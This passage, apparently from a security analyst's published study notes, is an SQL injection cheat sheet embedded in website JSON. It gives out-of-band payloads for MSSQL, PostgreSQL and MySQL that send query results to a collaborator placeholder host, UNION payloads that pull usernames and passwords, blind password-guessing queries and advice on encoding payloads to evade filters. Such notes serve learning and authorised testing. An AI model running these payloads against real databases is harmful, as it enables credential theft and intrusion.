keyword\"\u003eFROM\u003c/span\u003e dual\nMicrosoft\t\u003cspan class=\"token keyword\"\u003edeclare\u003c/span\u003e \u003cspan class=\"token variable\"\u003e@p\u003c/span\u003e \u003cspan class=\"token keyword\"\u003evarchar\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e1024\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eset\u003c/span\u003e \u003cspan class=\"token variable\"\u003e@p\u003c/span\u003e\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e YOUR\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eQUERY\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eexec\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'master..xp_dirtree \"//'\u003c/span\u003e\u003cspan class=\"token operator\"\u003e+\u003c/span\u003e\u003cspan class=\"token variable\"\u003e@p\u003c/span\u003e\u003cspan class=\"token operator\"\u003e+\u003c/span\u003e\u003cspan class=\"token string\"\u003e'.BURP-COLLABORATOR-SUBDOMAIN/a\"'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nPostgreSQL\t\u003cspan class=\"token keyword\"\u003ecreate\u003c/span\u003e \u003cspan class=\"token operator\"\u003eOR\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ereplace\u003c/span\u003e \u003cspan class=\"token keyword\"\u003efunction\u003c/span\u003e f\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ereturns\u003c/span\u003e void \u003cspan class=\"token keyword\"\u003eas\u003c/span\u003e $$\n\u003cspan class=\"token keyword\"\u003edeclare\u003c/span\u003e c \u003cspan class=\"token keyword\"\u003etext\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003edeclare\u003c/span\u003e p \u003cspan class=\"token keyword\"\u003etext\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003ebegin\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token keyword\"\u003einto\u003c/span\u003e p \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e YOUR\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eQUERY\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\nc :\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e'copy (SELECT '''') to program ''nslookup '\u003c/span\u003e\u003cspan class=\"token operator\"\u003e||\u003c/span\u003ep\u003cspan class=\"token operator\"\u003e||\u003c/span\u003e\u003cspan class=\"token string\"\u003e'.BURP-COLLABORATOR-SUBDOMAIN'''\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eexecute\u003c/span\u003e c\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eEND\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n$$ \u003cspan class=\"token keyword\"\u003elanguage\u003c/span\u003e plpgsql security \u003cspan class=\"token keyword\"\u003edefiner\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e f\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\nMySQL\tThe \u003cspan class=\"token keyword\"\u003efollowing\u003c/span\u003e technique works \u003cspan class=\"token keyword\"\u003eon\u003c/span\u003e Windows only:\n\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e YOUR\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eQUERY\u003cspan class=\"token operator\"\u003e-\u003c/span\u003eHERE \u003cspan class=\"token keyword\"\u003eINTO\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eOUTFILE\u003c/span\u003e \u003cspan class=\"token string\"\u003e'\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"union-attacks\"\u003eUNION attacks\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#union-attacks\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003eFor a UNION query to work, two key requirements must be met:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eThe individual queries must return the same number of columns.\u003cbr\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eThe data types in each column must be compatible between the individual queries.\u003c/p\u003e\n\u003cp\u003e  \u003cstrong\u003eNumber of columns:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003e\u003cspan class=\"token string\"\u003e' ORDER BY 1--\n'\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eORDER\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eBY\u003c/span\u003e \u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token comment\"\u003e--\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e until error\n\n\u003cspan class=\"token operator\"\u003eOR\u003c/span\u003e\n\n\u003cspan class=\"token string\"\u003e' UNION SELECT NULL--\n'\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eUNION\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token boolean\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token comment\"\u003e--\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e until success\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e  \u003cstrong\u003eProbing for string data in columns:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003e\u003cspan class=\"token string\"\u003e' UNION SELECT '\u003c/span\u003ea\u003cspan class=\"token string\"\u003e',NULL,NULL,NULL--\n'\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eUNION\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e'a'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token boolean\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token boolean\"\u003eNULL\u003c/span\u003e\u003cspan class=\"token comment\"\u003e--\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e until successfully injected string \u003cspan class=\"token keyword\"\u003evalue\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e  \u003cstrong\u003eRetrieving data\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003e' \u003cspan class=\"token keyword\"\u003eUNION\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e username\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e password \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e users\u003cspan class=\"token comment\"\u003e--\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e  \u003cstrong\u003eRetrieving multiple values within a single column\u003c/strong\u003e\n\u003cbr\u003e\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003e\u003cspan class=\"token string\"\u003e' UNION SELECT username || '\u003c/span\u003e\u003cspan class=\"token operator\"\u003e~\u003c/span\u003e' \u003cspan class=\"token operator\"\u003e||\u003c/span\u003e password \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e users\u003cspan class=\"token comment\"\u003e--\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"blind-injection\"\u003eBlind Injection\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#blind-injection\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eDivide and conquer password guessing:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003e\u003cspan class=\"token string\"\u003e' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '\u003c/span\u003eAdministrator\u003cspan class=\"token string\"\u003e'), 1, 1) \u003e '\u003c/span\u003em\n\n\u003cspan class=\"token keyword\"\u003eIF\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eTRUE\u003c/span\u003e:\n\nxyz\u003cspan class=\"token string\"\u003e' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '\u003c/span\u003eAdministrator\u003cspan class=\"token string\"\u003e'), 1, 1) \u003e '\u003c/span\u003et\n\n\u003cspan class=\"token keyword\"\u003eIF\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eFALSE\u003c/span\u003e:\nTry \u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e example:\nxyz\u003cspan class=\"token string\"\u003e' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '\u003c/span\u003eAdministrator\u003cspan class=\"token string\"\u003e'), 1, 1) = '\u003c/span\u003es\n\n\u003cspan class=\"token keyword\"\u003eIF\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eTRUE\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003efirst\u003c/span\u003e letter \u003cspan class=\"token keyword\"\u003eof\u003c/span\u003e the password has been found\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"sql-injection-in-different-contexts\"\u003eSQL injection in different contexts\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#sql-injection-in-different-contexts\"\u003e\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e***JSON or XML based SQL injection often require code obfuscation.\n\u003cbr\u003e\nMost common encoder:\nurlencode, dec, html entity\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://hackvertor.co.uk/public\"\u003eHackvertor\u003c/a\u003e is a good tool to start with.\u003cbr\u003e\nAlso there is a plugin for Burp with the same name working with repeater.\u003c/p\u003e\n\u003chr\u003e\n\u003cstrong\u003eBacklinks\u003c/strong\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/Notes/notes/t7zelcb6b17opo2gjy4y9cq\"\u003eCheat Sheets:\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","noteIndex":{"id":"dkhaxs77zw01c445jl4oetr","title":"My Dendron Notes","desc":"","updated":1703545954419,"created":1673083387776,"custom":{"nav_order":0,"permalink":"/"},"fname":"root","type":"note","vault":{"fsPath":".","selfContained":true,"name":"Cybersecurity_Notes"},"contentHash":"7f471efbabd9262e18133bac0489cf83","links":[],"anchors":{"welcome-to-my-dendron-notes":{"type":"header","text":"Welcome to my Dendron Notes:","value":"welcome-to-my-dendron-notes","line":7,"column":0,"depth":1},"lookup":{"type":"header","text":"Lookup","value":"lookup","line":11,"column":0,"depth":2}},"children":["irggoj29glx2y8z3yum2w64","t7zelcb6b17opo2gjy4y9cq","h42642wolzf824la84a6bb7","m7j2ktba2hjk9l6avnxa7bw"],"parent":null,"data":{},"body":"# Welcome to my Dendron Notes:\n\nI am a Cyber Security Analyst/Network Administrator. A highly motivated and energetic individual, ready to start work as soon as possible. Ready to learn new skills, take on challenges and complete any education/licensing examinations necessary for career growth. Proactive critical thinker and quick learner with extremely strong work ethic. An effective problem solver who brings both technical aptitude and an understanding of business processes. Able to leverage background in finance and technical skills to evaluate complex problems faced by business. Motivated by innovation and seeking to join an organisation that will provide opportunities for professional development in a dynamic and technical team environment. Passionate about cyber security and focused on governance, risk and compliance. Member of AISA (Australian Information Security Association).\n\n## Lookup\n\nThis section contains useful links to related resources.\n\n- [Getting Started Guide](https://link.dendron.so/6b25)\n- [Discord](https://link.dendron.so/6b23)\n- [Home Page](https://wiki.dendron.so/)\n- [Github](https://link.dendron.so/6b24)\n- [Developer Docs](https://docs.dendron.so/)"},"collectionChildren":null,"customHeadContent":null,"config":{"version":5,"dev":{"enablePreviewV2":true,"enableSelfContainedVaults":true},"commands":{"lookup":{"note":{"selectionMode":"extract","confirmVaultOnCreate":true,"vaultSelectionModeOnCreate":"smart","leaveTrace":false,"bubbleUpCreateNew":true,"fuzzThreshold":0.2}},"randomNote":{},"insertNoteLink":{"aliasMode":"none","enableMultiSelect":false},"insertNoteIndex":{"enableMarker":false},"copyNoteLink":{"aliasMode":"title"},"templateHierarchy":"template"},"workspace":{"vaults":[{"fsPath":".","selfContained":true,"name":"Cybersecurity_Notes"}],"journal":{"dailyDomain":"daily","name":"journal","dateFormat":"y.MM.dd","addBehavior":"childOfDomain"},"scratch":{"name":"scratch","dateFormat":"y.MM.dd.HHmmss","addBehavior":"asOwnDomain"},"task":{"name":"task","dateFormat":"y.MM.dd","addBehavior":"asOwnDomain","statusSymbols":{"":" ","wip":"w","done":"x","assigned":"a","moved":"m","blocked":"b","delegated":"l","dropped":"d","pending":"y"},"taskCompleteStatus":["done","x"],"prioritySymbols":{"H":"high","M":"medium","L":"low"},"todoIntegration":false,"createTaskSelectionType":"selection2link"},"graph":{"zoomSpeed":1,"createStub":false},"enableAutoCreateOnDefinition":false,"enableXVaultWikiLink":false,"enableRemoteVaultInit":true,"enableUserTags":true,"enableHashTags":true,"workspaceVaultSyncMode":"noCommit","enableAutoFoldFrontmatter":false,"enableEditorDecorations":true,"maxPreviewsCached":10,"maxNoteLength":204800,"enableFullHierarchyNoteTitle":false},"preview":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enablePrettyRefs":true,"enableKatex":true,"automaticallyShowPreview":false},"publishing":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enablePrettyRefs":true,"enableKatex":true,"copyAssets":true,"siteHierarchies":["root"],"writeStubs":false,"siteRootDir":"docs","seo":{"title":"My Dendron Notes","description":"Personal Knowledge Space"},"github":{"enableEditLink":true,"editLinkText":"Edit this page on GitHub","editBranch":"main","editViewMode":"tree"},"enableSiteLastModified":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enableRandomlyColoredTags":true,"enableTaskNotes":true,"enablePrettyLinks":true,"searchMode":"search","assetsPrefix":"/Notes","siteUrl":"https://greguus.github.io/","enableHierarchyDisplay":false,"siteFaviconPath":"favicon.ico","siteIndex":"root"}}},"__N_SSG":true},"page":"/notes/[id]","query":{"id":"ecm8gbfd442dpxbe5fggfzo"},"buildId":"j9CSGb22FfOPbRIS6QcPV","assetPrefix":"/Notes","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>